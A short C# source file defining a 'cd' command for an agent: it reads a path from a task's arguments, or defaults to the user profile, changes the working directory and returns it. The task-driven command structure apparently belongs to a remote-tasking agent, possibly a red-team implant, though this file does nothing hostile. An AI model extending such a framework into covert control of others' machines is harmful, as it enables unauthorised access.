﻿using Agent.Models;
using System;
using System.IO;


namespace Agent.Commands
{
    public class ChangeDirectory : AgentsCommand
    {

        public override string Name => "cd";
         


        public override string Execute(AgentTask task)
        {
            string path;
            if (task.Arguments is null || task.Arguments.Length == 0)
            {
                path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

            }
            else
            {

                path = task.Arguments[0];

            }
            Directory.SetCurrentDirectory(path);

            return Directory.GetCurrentDirectory();

        }
    }
}
